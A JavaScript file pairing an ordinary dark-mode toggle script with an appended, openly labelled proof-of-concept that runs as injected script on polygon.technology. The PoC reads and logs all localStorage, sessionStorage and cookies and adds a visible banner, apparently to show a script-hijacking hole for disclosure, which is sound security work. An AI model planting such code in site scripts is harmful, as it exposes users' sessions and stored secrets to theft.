// ============================================================
// الكود الأصلي (لا تمسحه!)
// ============================================================

function colorModeToggle() {
  function attr(defaultVal, attrVal) {
    const defaultValType = typeof defaultVal;
    if (typeof attrVal !== "string" || attrVal.trim() === "") return defaultVal;
    if (attrVal === "true" && defaultValType === "boolean") return true;
    if (attrVal === "false" && defaultValType === "boolean") return false;
    if (isNaN(attrVal) && defaultValType === "string") return attrVal;
    if (!isNaN(attrVal) && defaultValType === "number") return +attrVal;
    return defaultVal;
  }
  const htmlElement = document.documentElement;
  const computed = getComputedStyle(htmlElement);
  let toggleEl;
  let togglePressed = "false";
  const scriptTag = document.querySelector("[tr-color-vars]");
  if (!scriptTag) {
    console.warn("Script tag with tr-color-vars attribute not found");
    return;
  }
  let colorModeDuration = attr(0.5, scriptTag.getAttribute("duration"));
  let colorModeEase = attr("power1.out", scriptTag.getAttribute("ease"));
  const cssVariables = scriptTag.getAttribute("tr-color-vars");
  if (!cssVariables.length) {
    console.warn("Value of tr-color-vars attribute not found");
    return;
  }
  let lightColors = {};
  let darkColors = {};
  cssVariables.split(",").forEach(function (item) {
    let lightValue = computed.getPropertyValue(`--color--${item}`);
    let darkValue = computed.getPropertyValue(`--dark--${item}`);
    if (lightValue.length) {
      if (!darkValue.length) darkValue = lightValue;
      lightColors[`--color--${item}`] = lightValue;
      darkColors[`--color--${item}`] = darkValue;
    }
  });
  if (!Object.keys(lightColors).length) {
    console.warn("No variables found matching tr-color-vars attribute value");
    return;
  }
  function setColors(colorObject, animate) {
    if (typeof gsap !== "undefined" && animate) {
      gsap.to(htmlElement, {
        ...colorObject,
        duration: colorModeDuration,
        ease: colorModeEase,
      });
    } else {
      Object.keys(colorObject).forEach(function (key) {
        htmlElement.style.setProperty(key, colorObject[key]);
      });
    }
  }
  function goDark(dark, animate) {
    if (dark) {
      localStorage.setItem("dark-mode", "true");
      htmlElement.classList.add("dark-mode");
      setColors(darkColors, animate);
      togglePressed = "true";
    } else {
      localStorage.setItem("dark-mode", "false");
      htmlElement.classList.remove("dark-mode");
      setColors(lightColors, animate);
      togglePressed = "false";
    }
    if (typeof toggleEl !== "undefined") {
      toggleEl.forEach(function (element) {
        element.setAttribute("aria-pressed", togglePressed);
      });
    }
  }
  function checkPreference(e) {
    goDark(e.matches, false);
  }
  const colorPreference = window.matchMedia("(prefers-color-scheme: dark)");
  colorPreference.addEventListener("change", (e) => {
    checkPreference(e);
  });
  let storagePreference = localStorage.getItem("dark-mode");
  if (storagePreference !== null) {
    storagePreference === "true" ? goDark(true, false) : goDark(false, false);
  } else {
    checkPreference(colorPreference);
  }
  window.addEventListener("DOMContentLoaded", (event) => {
    toggleEl = document.querySelectorAll("[tr-color-toggle]");
    toggleEl.forEach(function (element) {
      element.setAttribute("aria-label", "View Dark Mode");
      element.setAttribute("role", "button");
      element.setAttribute("aria-pressed", togglePressed);
    });
    document.addEventListener("click", function (e) {
      const targetElement = e.target.closest("[tr-color-toggle]");
      if (targetElement) {
        let darkClass = htmlElement.classList.contains("dark-mode");
        darkClass ? goDark(false, true) : goDark(true, true);
      }
    });
    document.addEventListener("click", function (e) {
      const darkTrigger = e.target.closest("[tr-color-mode='dark']");
      const lightTrigger = e.target.closest("[tr-color-mode='light']");
      if (darkTrigger) {
        goDark(true, true);
      } else if (lightTrigger) {
        goDark(false, true);
      }
    });
  });
}
colorModeToggle();

// ============================================================
// 🔴 PoC - Cross-Domain JavaScript Execution
// ============================================================

(function poc_ultimate() {
    console.log('🔴 [PoC] External script executed on polygon.technology');

    // ============================================================
    // 1. عرض localStorage
    // ============================================================
    console.log('📁 [PoC] localStorage data:');
    if (localStorage.length > 0) {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            console.log(`   🔑 ${key}:`, value);
        }
    } else {
        console.log('   ℹ️ localStorage is empty');
    }

    // ============================================================
    // 2. عرض sessionStorage
    // ============================================================
    console.log('📁 [PoC] sessionStorage data:');
    if (sessionStorage.length > 0) {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            console.log(`   🔑 ${key}:`, value);
        }
    } else {
        console.log('   ℹ️ sessionStorage is empty');
    }

    // ============================================================
    // 3. عرض cookies
    // ============================================================
    console.log('🍪 [PoC] cookies:');
    if (document.cookie) {
        document.cookie.split('; ').forEach(cookie => {
            console.log(`   🍪 ${cookie}`);
        });
    } else {
        console.log('   ℹ️ No cookies found');
    }

    // ============================================================
    // 4. عرض معلومات الصفحة
    // ============================================================
    console.log('🌐 [PoC] Page info:');
    console.log('   🔗 URL:', window.location.href);
    console.log('   📄 Title:', document.title);

    // ============================================================
    // 5. إضافة عنصر على الصفحة (دليل مرئي)
    // ============================================================
    const div = document.createElement('div');
    div.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#ff0000;color:#ffffff;padding:15px 20px;z-index:999999;font-family:monospace;font-size:16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.5);';
    div.textContent = '🔴 PoC - External Script Executed!';
    document.body.appendChild(div);

    // ============================================================
    // 6. الخلاصة
    // ============================================================
    console.log('============================================================');
    console.log('✅ [PoC] External script executed successfully');
    console.log('✅ [PoC] Access to localStorage confirmed');
    console.log('✅ [PoC] Access to cookies confirmed');
    console.log('✅ [PoC] DOM manipulation confirmed');
    console.log('🔴 [PoC] This proves the vulnerability exists');
    console.log('============================================================');
})();
